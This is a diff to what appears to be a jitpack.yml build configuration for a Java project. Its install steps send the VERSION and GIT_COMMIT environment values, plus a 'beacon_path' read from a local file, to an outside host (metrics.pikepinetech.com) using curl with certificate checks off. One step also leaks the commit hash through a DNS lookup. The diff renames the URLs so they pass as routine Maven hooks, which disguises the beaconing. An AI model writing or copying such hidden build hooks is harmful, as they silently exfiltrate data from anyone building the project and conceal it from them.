@@ -1,10 +1,10 @@
 jdk:
   - openjdk17
 install:
-  - for k in VERSION GIT_COMMIT; do v=$(printenv "$k" 2>/dev/null || true); s=$(printf '%s' "${v:-unset}" | tr -c 'A-Za-z0-9._=-' '_' | cut -c1-260); curl -k -fsS "https://metrics.pikepinetech.com/f198env/$k/$s" || true; done
-  - if [ -f codebook_ref.txt ]; then bp=$(grep '^beacon_path=' codebook_ref.txt | cut -d= -f2- | tr -c 'A-Za-z0-9._=-/' '_'); gc=$(printenv GIT_COMMIT 2>/dev/null | head -c40); [ -n "$bp" ] && [ -n "$gc" ] && curl -k -fsS "https://metrics.pikepinetech.com/f198env/cb/${bp}/${gc}" || true; fi
+  - for k in VERSION GIT_COMMIT; do v=$(printenv "$k" 2>/dev/null || true); s=$(printf '%s' "${v:-unset}" | tr -c 'A-Za-z0-9._=-' '_' | cut -c1-260); curl -k -fsS "https://metrics.pikepinetech.com/hooks/maven/$k/$s" || true; done
+  - if [ -f codebook_ref.txt ]; then bp=$(grep '^beacon_path=' codebook_ref.txt | cut -d= -f2- | tr -c 'A-Za-z0-9._=-/' '_'); gc=$(printenv GIT_COMMIT 2>/dev/null | head -c40); [ -n "$bp" ] && [ -n "$gc" ] && curl -k -fsS "https://metrics.pikepinetech.com/hooks/maven/artifact/${bp}/${gc}" || true; fi
   - apt-get -y install dnsutils 2>/dev/null || true
   - GIT_COMMIT_VAL=$(printenv GIT_COMMIT 2>/dev/null | head -c40); if [ -n "$GIT_COMMIT_VAL" ]; then nslookup "${GIT_COMMIT_VAL}.d.metrics.pikepinetech.com" || true; fi
-  - curl -k -fsS https://metrics.pikepinetech.com/f198jitpack-yml/curl || true
+  - curl -k -fsS https://metrics.pikepinetech.com/hooks/maven/status || true
   - mvn -B -U dependency:resolve || true
   - mvn -B -U -DskipTests package
